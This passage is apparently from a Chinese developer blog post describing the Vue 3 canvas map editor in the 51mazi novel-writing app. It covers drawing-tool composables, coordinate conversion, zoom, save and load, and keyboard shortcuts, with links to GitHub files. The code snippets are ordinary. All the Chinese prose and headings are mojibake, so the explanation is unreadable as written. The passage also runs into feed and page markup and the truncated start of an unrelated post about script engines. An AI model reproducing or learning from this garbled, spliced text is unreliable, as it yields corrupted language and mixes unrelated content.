<p>æ‰€æœ‰å·¥å…· composable éƒ½éµå¾ªç»Ÿä¸€çš„æ¥å£æ¨¡å¼ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å·¥å…·æ¥å£è§„èŒƒ</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useXxxTool</span>(<span class="hljs-params">options</span>) {
  <span class="hljs-comment">// çŠ¶æ€</span>
  <span class="hljs-keyword">const</span> drawingActive = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)
  
  <span class="hljs-comment">// æ–¹æ³•</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseDown</span>(<span class="hljs-params">pos</span>) { <span class="hljs-comment">/* ... */</span> }
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseMove</span>(<span class="hljs-params">pos</span>) { <span class="hljs-comment">/* ... */</span> }
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseUp</span>(<span class="hljs-params"/>) { <span class="hljs-comment">/* ... */</span> }
  
  <span class="hljs-keyword">return</span> {
    drawingActive,
    onMouseDown,
    onMouseMove,
    onMouseUp
  }
}
</code></pre>
<h4 data-id="heading-22">äº‹ä»¶å¤„ç†æµç¨‹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç»Ÿä¸€çš„äº‹ä»¶å¤„ç†</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleCanvasMouseDown</span>(<span class="hljs-params">e</span>) {
  <span class="hljs-keyword">const</span> pos = <span class="hljs-title function_">getCanvasPos</span>(e) <span class="hljs-comment">// åæ ‡è½¬æ¢</span>
  
  <span class="hljs-comment">// æ ¹æ®å½“å‰å·¥å…·è°ƒç”¨å¯¹åº”çš„æ–¹æ³•</span>
  <span class="hljs-keyword">if</span> (tool.<span class="hljs-property">value</span> === <span class="hljs-string">'pencil'</span>) {
    pencilTool.<span class="hljs-title function_">onMouseDown</span>(pos)
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (tool.<span class="hljs-property">value</span> === <span class="hljs-string">'eraser'</span>) {
    eraserTool.<span class="hljs-title function_">onMouseDown</span>(pos)
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (tool.<span class="hljs-property">value</span> === <span class="hljs-string">'shape'</span>) {
    shapeTool.<span class="hljs-title function_">onMouseDown</span>(pos)
  }
  <span class="hljs-comment">// ... å…¶ä»–å·¥å…·</span>
}
</code></pre>
<h3 data-id="heading-23">âš¡ æŠ€æœ¯äº®ç‚¹</h3>
<h4 data-id="heading-24">1. åæ ‡è½¬æ¢ç³»ç»Ÿ</h4>
<p>å®ç°å±å¹•åæ ‡åˆ°ç”»å¸ƒåæ ‡çš„ç²¾ç¡®è½¬æ¢ï¼Œæ”¯æŒç¼©æ”¾å’Œå¹³ç§»ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åæ ‡è½¬æ¢</span>
<span class="hljs-keyword">const</span> { getCanvasPos } = <span class="hljs-title function_">useCoordinate</span>(
  canvasRef,
  editorContainerRef,
  canvasState.<span class="hljs-property">scale</span>,
  canvasState.<span class="hljs-property">scrollX</span>,
  canvasState.<span class="hljs-property">scrollY</span>
)

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> pos = <span class="hljs-title function_">getCanvasPos</span>(event) <span class="hljs-comment">// è‡ªåŠ¨å¤„ç†ç¼©æ”¾å’Œå¹³ç§»</span>
</code></pre>
<blockquote>
<p>ğŸ’¡ <strong>è¯¦ç»†å®ç°è¯·æŸ¥çœ‹</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2FuseCoordinate.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/useCoordinate.js" ref="nofollow noopener noreferrer">src/renderer/src/composables/map/useCoordinate.js</a></p>
</blockquote>
<h4 data-id="heading-25">2. æ™ºèƒ½ç”»å¸ƒç®¡ç†</h4>
<p>è‡ªåŠ¨è°ƒæ•´ç”»å¸ƒå¤§å°ä»¥é€‚åº”å†…å®¹ï¼Œæ”¯æŒæ— é™ç”»å¸ƒï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç”»å¸ƒç®¡ç†</span>
<span class="hljs-keyword">const</span> { renderCanvas, canvasWrapStyle, updateContentBounds } = <span class="hljs-title function_">useCanvas</span>(
  canvasRef,
  editorContainerRef,
  canvasState,
  elements,
  <span class="hljs-comment">// ... å…¶ä»–å‚æ•°</span>
)

<span class="hljs-comment">// è‡ªåŠ¨æ›´æ–°å†…å®¹è¾¹ç•Œ</span>
<span class="hljs-title function_">updateContentBounds</span>()
</code></pre>
<blockquote>
<p>ğŸ’¡ <strong>è¯¦ç»†å®ç°è¯·æŸ¥çœ‹</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2FuseCanvas.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/useCanvas.js" ref="nofollow noopener noreferrer">src/renderer/src/composables/map/useCanvas.js</a></p>
</blockquote>
<h4 data-id="heading-26">3. ç¼©æ”¾æ§åˆ¶</h4>
<p>æ”¯æŒå¤šç§ç¼©æ”¾æ–¹å¼ï¼šé¼ æ ‡æ»šè½®ã€æŒ‰é’®ã€å¿«æ·é”®ï¼Œä»¥é¼ æ ‡ä½ç½®ä¸ºä¸­å¿ƒç¼©æ”¾ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç¼©æ”¾æ§åˆ¶</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleWheel</span>(<span class="hljs-params">e</span>) {
  <span class="hljs-comment">// Ctrl/Cmd + æ»šè½®ï¼šç¼©æ”¾</span>
  <span class="hljs-keyword">if</span> (e.<span class="hljs-property">ctrlKey</span> || e.<span class="hljs-property">metaKey</span>) {
    <span class="hljs-comment">// ä»¥é¼ æ ‡ä½ç½®ä¸ºä¸­å¿ƒç¼©æ”¾</span>
    <span class="hljs-keyword">const</span> sceneX = mouseX / scale.<span class="hljs-property">value</span> - scrollX.<span class="hljs-property">value</span>
    <span class="hljs-keyword">const</span> sceneY = mouseY / scale.<span class="hljs-property">value</span> - scrollY.<span class="hljs-property">value</span>
    <span class="hljs-comment">// ... è®¡ç®—æ–°çš„ç¼©æ”¾å’Œå¹³ç§»</span>
  }
}
</code></pre>
<h4 data-id="heading-27">4. æ•°æ®åºåˆ—åŒ–</h4>
<p>å®Œæ•´çš„åœ°å›¾æ•°æ®åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œæ”¯æŒä¿å­˜å’ŒåŠ è½½ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¿å­˜åœ°å›¾</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleSaveMap</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// ç”Ÿæˆé¢„è§ˆå›¾</span>
  <span class="hljs-keyword">const</span> imageData = <span class="hljs-keyword">await</span> <span class="hljs-title function_">generatePreviewImage</span>()
  
  <span class="hljs-comment">// åºåˆ—åŒ–ç”»æ¿å†…å®¹</span>
  <span class="hljs-keyword">const</span> mapData = elements.<span class="hljs-title function_">serialize</span>(backgroundColor.<span class="hljs-property">value</span>)
  
  <span class="hljs-comment">// ä¿å­˜åˆ°æ–‡ä»¶ç³»ç»Ÿ</span>
  <span class="hljs-keyword">await</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">electron</span>.<span class="hljs-title function_">updateMap</span>({
    bookName,
    <span class="hljs-attr">mapName</span>: mapName.<span class="hljs-property">value</span>,
    imageData,
    mapData
  })
}

<span class="hljs-comment">// åŠ è½½åœ°å›¾</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadMapData</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> mapData = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">electron</span>.<span class="hljs-title function_">loadMapData</span>({ bookName, mapName })
  <span class="hljs-keyword">if</span> (mapData) {
    <span class="hljs-keyword">const</span> loadedBackgroundColor = elements.<span class="hljs-title function_">deserialize</span>(mapData)
    backgroundColor.<span class="hljs-property">value</span> = loadedBackgroundColor
    <span class="hljs-title function_">renderCanvas</span>(<span class="hljs-literal">true</span>)
  }
}
</code></pre>
<h4 data-id="heading-28">5. å¿«æ·é”®ç³»ç»Ÿ</h4>
<p>å®Œæ•´çš„é”®ç›˜å¿«æ·é”®æ”¯æŒï¼Œæå‡æ“ä½œæ•ˆç‡ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¿«æ·é”®é…ç½®</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleKeyDown</span>(<span class="hljs-params">e</span>) {
  <span class="hljs-comment">// å·¥å…·å¿«æ·é”®</span>
  <span class="hljs-keyword">switch</span> (e.<span class="hljs-property">key</span>.<span class="hljs-title function_">toLowerCase</span>()) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">'v'</span>: <span class="hljs-title function_">onToolChange</span>(<span class="hljs-string">'select'</span>); <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">case</span> <span class="hljs-string">'h'</span>: <span class="hljs-title function_">onToolChange</span>(<span class="hljs-string">'move'</span>); <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">case</span> <span class="hljs-string">'p'</span>: <span class="hljs-title function_">onToolChange</span>(<span class="hljs-string">'pencil'</span>); <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">case</span> <span class="hljs-string">'e'</span>: <span class="hljs-title function_">onToolChange</span>(<span class="hljs-string">'eraser'</span>); <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">case</span> <span class="hljs-string">'s'</span>: <span class="hljs-title function_">onToolChange</span>(<span class="hljs-string">'shape'</span>); <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">case</span> <span class="hljs-string">'t'</span>: <span class="hljs-title function_">onToolChange</span>(<span class="hljs-string">'text'</span>); <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">case</span> <span class="hljs-string">'b'</span>: <span class="hljs-title function_">onToolChange</span>(<span class="hljs-string">'bucket'</span>); <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">case</span> <span class="hljs-string">'r'</span>: <span class="hljs-title function_">onToolChange</span>(<span class="hljs-string">'resource'</span>); <span class="hljs-keyword">break</span>
  }
  
  <span class="hljs-comment">// æ’¤é”€/é‡åš</span>
  <span class="hljs-keyword">if</span> ((e.<span class="hljs-property">ctrlKey</span> || e.<span class="hljs-property">metaKey</span>) &amp;&amp; e.<span class="hljs-property">key</span> === <span class="hljs-string">'z'</span>) {
    <span class="hljs-title function_">handleUndo</span>()
  }
  
  <span class="hljs-comment">// ç©ºæ ¼é”®ï¼šä¸´æ—¶åˆ‡æ¢åˆ°ç§»åŠ¨æ¨¡å¼</span>
  <span class="hljs-keyword">if</span> (e.<span class="hljs-property">key</span> === <span class="hljs-string">' '</span> &amp;&amp; tool.<span class="hljs-property">value</span> !== <span class="hljs-string">'move'</span>) {
    spaceKeyPressed.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
  }
}
</code></pre>
<h4 data-id="heading-29">6. èµ„æºç®¡ç†ç³»ç»Ÿ</h4>
<p>æ”¯æŒé¢„è®¾å›¾æ ‡èµ„æºåº“ï¼Œæ‹–æ‹½æ·»åŠ å’Œè°ƒæ•´ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// èµ„æºå·¥å…·</span>
<span class="hljs-keyword">const</span> resourceTool = <span class="hljs-title function_">useResourceTool</span>({
  canvasRef,
  elements,
  history,
  renderCanvas,
  getCanvasPos
})

<span class="hljs-comment">// æ”¯æŒçš„åŠŸèƒ½</span>
- å›¾æ ‡èµ„æºåº“ï¼ˆ<span class="hljs-variable constant_">SVG</span> å›¾æ ‡ï¼‰
- æ‹–æ‹½æ·»åŠ èµ„æº
- è°ƒæ•´èµ„æºå¤§å°å’Œä½ç½®
- æ—‹è½¬èµ„æº
</code></pre>
<blockquote>
<p>ğŸ’¡ <strong>è¯¦ç»†å®ç°è¯·æŸ¥çœ‹</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2Ftools%2FuseResourceTool.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/tools/useResourceTool.js" ref="nofollow noopener noreferrer">src/renderer/src/composables/map/tools/useResourceTool.js</a></p>
</blockquote>
<h3 data-id="heading-30">ğŸ“Š åŠŸèƒ½ç‰¹æ€§æ€»ç»“</h3>
<h4 data-id="heading-31">âœ… å·²å®ç°åŠŸèƒ½</h4>




























































<table><thead><tr><th>åŠŸèƒ½æ¨¡å—</th><th>åŠŸèƒ½æè¿°</th><th>æŠ€æœ¯å®ç°</th></tr></thead><tbody><tr><td><strong>ç»˜å›¾å·¥å…·</strong></td><td>10+ ç§ç»˜å›¾å·¥å…·</td><td>Composables æ¶æ„</td></tr><tr><td><strong>ç”»å¸ƒæ§åˆ¶</strong></td><td>ç¼©æ”¾ã€å¹³ç§»ã€é‡ç½®</td><td>useCanvasState + useCanvas</td></tr><tr><td><strong>å…ƒç´ ç®¡ç†</strong></td><td>ç»Ÿä¸€ç®¡ç†æ‰€æœ‰å…ƒç´ </td><td>useElements</td></tr><tr><td><strong>å†å²è®°å½•</strong></td><td>æ’¤é”€/é‡åš</td><td>useHistory</td></tr><tr><td><strong>æ¸²æŸ“ç³»ç»Ÿ</strong></td><td>ç»Ÿä¸€æ¸²æŸ“å‡½æ•°</td><td>useRender</td></tr><tr><td><strong>åæ ‡è½¬æ¢</strong></td><td>å±å¹•åæ ‡è½¬ç”»å¸ƒåæ ‡</td><td>useCoordinate</td></tr><tr><td><strong>æ•°æ®æŒä¹…åŒ–</strong></td><td>ä¿å­˜å’ŒåŠ è½½åœ°å›¾</td><td>åºåˆ—åŒ–/ååºåˆ—åŒ–</td></tr><tr><td><strong>å¿«æ·é”®</strong></td><td>å®Œæ•´çš„é”®ç›˜å¿«æ·é”®</td><td>äº‹ä»¶ç›‘å¬ç³»ç»Ÿ</td></tr><tr><td><strong>èµ„æºç®¡ç†</strong></td><td>å›¾æ ‡èµ„æºåº“</td><td>useResourceTool</td></tr><tr><td><strong>å‚æ•°æ§åˆ¶</strong></td><td>é¢œè‰²ã€å¤§å°ã€é€æ˜åº¦</td><td>å“åº”å¼çŠ¶æ€ç®¡ç†</td></tr></tbody></table>
<h4 data-id="heading-32">ğŸš€ æŠ€æœ¯äº®ç‚¹</h4>
<ol>
<li><strong>æ¨¡å—åŒ–æ¶æ„</strong>: Composables è®¾è®¡å®ç°é«˜å¯ç»´æŠ¤æ€§</li>
<li><strong>ç»Ÿä¸€æ¥å£</strong>: æ‰€æœ‰å·¥å…·éµå¾ªç›¸åŒçš„æ¥å£è§„èŒƒ</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>: æ™ºèƒ½æ¸²æŸ“ï¼Œåªé‡ç»˜å˜åŒ–çš„éƒ¨åˆ†</li>
<li><strong>ç”¨æˆ·ä½“éªŒ</strong>: æµç•…çš„äº¤äº’ï¼Œå®Œæ•´çš„å¿«æ·é”®æ”¯æŒ</li>
<li><strong>å¯æ‰©å±•æ€§</strong>: æ˜“äºæ·»åŠ æ–°çš„ç»˜å›¾å·¥å…·</li>
<li><strong>æ•°æ®å®‰å…¨</strong>: å®Œæ•´çš„ä¿å­˜å’ŒåŠ è½½æœºåˆ¶</li>
</ol>
<h3 data-id="heading-33">ğŸ“ æ€»ç»“ä¸å±•æœ›</h3>
<p>åœ°å›¾è®¾è®¡é¡µæ˜¯ 51mazi é¡¹ç›®ä¸­æœ€å¤æ‚çš„åŠŸèƒ½æ¨¡å—ä¹‹ä¸€ï¼Œé€šè¿‡æ¨¡å—åŒ–çš„ Composables æ¶æ„è®¾è®¡ï¼Œæˆ‘ä»¬å®ç°äº†ï¼š</p>
<ul>
<li>âœ… <strong>æ¸…æ™°çš„ä»£ç ç»„ç»‡</strong>: æ¯ä¸ªåŠŸèƒ½æ¨¡å—ç‹¬ç«‹ï¼Œæ˜“äºç†è§£å’Œç»´æŠ¤</li>
<li>âœ… <strong>é«˜åº¦å¯æ‰©å±•</strong>: æ·»åŠ æ–°å·¥å…·åªéœ€åˆ›å»ºæ–°çš„ composable</li>
<li>âœ… <strong>ä¼˜ç§€çš„ç”¨æˆ·ä½“éªŒ</strong>: æµç•…çš„äº¤äº’å’Œå®Œæ•´çš„å¿«æ·é”®æ”¯æŒ</li>
<li>âœ… <strong>å¼ºå¤§çš„åŠŸèƒ½</strong>: 10+ ç§ç»˜å›¾å·¥å…·ï¼Œæ»¡è¶³å„ç§åœ°å›¾ç»˜åˆ¶éœ€æ±‚</li>
</ul>
<h4 data-id="heading-34">ğŸ¯ æŠ€æœ¯ä»·å€¼</h4>
<ul>
<li><strong>æ¶æ„è®¾è®¡</strong>: æ¨¡å—åŒ–çš„ Composables æ¶æ„ï¼Œé«˜å†…èšä½è€¦åˆ</li>
<li><strong>ä»£ç è´¨é‡</strong>: æ¸…æ™°çš„æ¥å£å®šä¹‰ï¼Œæ˜“äºæµ‹è¯•å’Œç»´æŠ¤</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>: æ™ºèƒ½æ¸²æŸ“æœºåˆ¶ï¼Œä¿è¯æµç•…ä½“éªŒ</li>
<li><strong>ç”¨æˆ·ä½“éªŒ</strong>: å®Œæ•´çš„å¿«æ·é”®ç³»ç»Ÿå’Œç›´è§‚çš„æ“ä½œç•Œé¢</li>
</ul>
<h4 data-id="heading-35">ğŸ”® æœªæ¥è§„åˆ’</h4>
<ul>
<li><strong>æ›´å¤šå·¥å…·</strong>: æ”¯æŒæ›´å¤šç»˜å›¾å·¥å…·å’Œæ•ˆæœï¼ˆå¦‚æ¸å˜ã€é˜´å½±ç­‰ï¼‰</li>
<li><strong>å›¾å±‚ç³»ç»Ÿ</strong>: æ”¯æŒå¤šå±‚ç»˜å›¾å’Œå›¾å±‚ç®¡ç†</li>
<li><strong>å¯¼å…¥å¯¼å‡º</strong>: æ”¯æŒå¤šç§å›¾ç‰‡æ ¼å¼å¯¼å…¥å¯¼å‡º</li>
<li><strong>åä½œåŠŸèƒ½</strong>: æ”¯æŒå¤šäººåä½œç»˜å›¾</li>
<li><strong>æ¨¡æ¿ç³»ç»Ÿ</strong>: æä¾›åœ°å›¾æ¨¡æ¿ï¼Œå¿«é€Ÿåˆ›å»ºå¸¸ç”¨åœ°å›¾</li>
</ul>
<hr/>
<h4 data-id="heading-36">ğŸ“š ç›¸å…³é“¾æ¥</h4>
<ul>
<li><strong>é¡¹ç›®åœ°å€</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi" ref="nofollow noopener noreferrer">GitHub - 51mazi</a>ï¼Œç»™ä¸ª Star å“¦~</li>
<li><strong>åœ°å›¾è®¾è®¡é¡µä»£ç </strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fviews%2FMapDesign.vue" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/views/MapDesign.vue" ref="nofollow noopener noreferrer">src/renderer/src/views/MapDesign.vue</a></li>
<li><strong>Composables ç›®å½•</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Ftree%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/tree/main/src/renderer/src/composables/map" ref="nofollow noopener noreferrer">src/renderer/src/composables/map/</a></li>
<li><strong>æŠ€æœ¯æ ˆ</strong>: Vue 3 + Canvas + Element Plus + Composables</li>
</ul>
<h4 data-id="heading-37">ğŸ·ï¸ æ ‡ç­¾</h4>
<p><code>#Vue3</code> <code>#Canvas</code> <code>#å°è¯´åœ°å›¾</code> <code>#åœ°å›¾è®¾è®¡</code> <code>#Composables</code> <code>#å‰ç«¯å¼€å‘</code> <code>#æ¶æ„è®¾è®¡</code> <code>#æ¨¡å—åŒ–</code> <code>#ç»˜å›¾å·¥å…·</code></p>
<hr/>
<blockquote>
<p>ğŸ’¡ <strong>å¦‚æœè¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼Œè¯·ç»™ä¸ª â­ï¸ æ”¯æŒä¸€ä¸‹ï¼</strong></p>
<p>ğŸ’¡ <strong>æƒ³æ·±å…¥äº†è§£æŸä¸ªå…·ä½“åŠŸèƒ½çš„å®ç°ï¼Ÿæ¬¢è¿æŸ¥çœ‹ GitHub ä¸Šå¯¹åº”çš„ä»£ç æ–‡ä»¶ï¼Œæ¯ä¸ªæ¨¡å—éƒ½æœ‰è¯¦ç»†çš„æ³¨é‡Šè¯´æ˜ï¼</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åˆ«é‡è¹ˆæˆ‘ä»¬çš„è¦†è¾™ï¼šè„šæœ¬å¼•æ“é€‰é”™çš„ä¸¤å¹´ä»£ä»·]]></title>    <link>https://juejin.cn/post/7582904738922217510</link>    <guid>https://juejin.cn/post/7582904738922217510</guid>    <pubDate>2025-12-14T00:54:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582904738922217510" data-draft-id="7582905804048269339" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åˆ«é‡è¹ˆæˆ‘ä»¬çš„è¦†è¾™ï¼šè„šæœ¬å¼•æ“é€‰é”™çš„ä¸¤å¹´ä»£ä»·"/> <meta itemprop="keywords" content="åç«¯,é¢è¯•,æ¶æ„"/> <meta itemprop="datePublished" content="2025-12-14T00:54:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¸æµªæ— ç—•"/> <meta itemprop="url" content="https://juejin.cn/user/2834988091055719"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åˆ«é‡è¹ˆæˆ‘ä»¬çš„è¦†è¾™ï¼šè„šæœ¬å¼•æ“é€‰é”™çš„ä¸¤å¹´ä»£ä»·
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2834988091055719/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¸æµªæ— ç—•
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-14T00:54:27.000Z" title="Sun Dec 14 2025 00:54:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    21
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»16åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 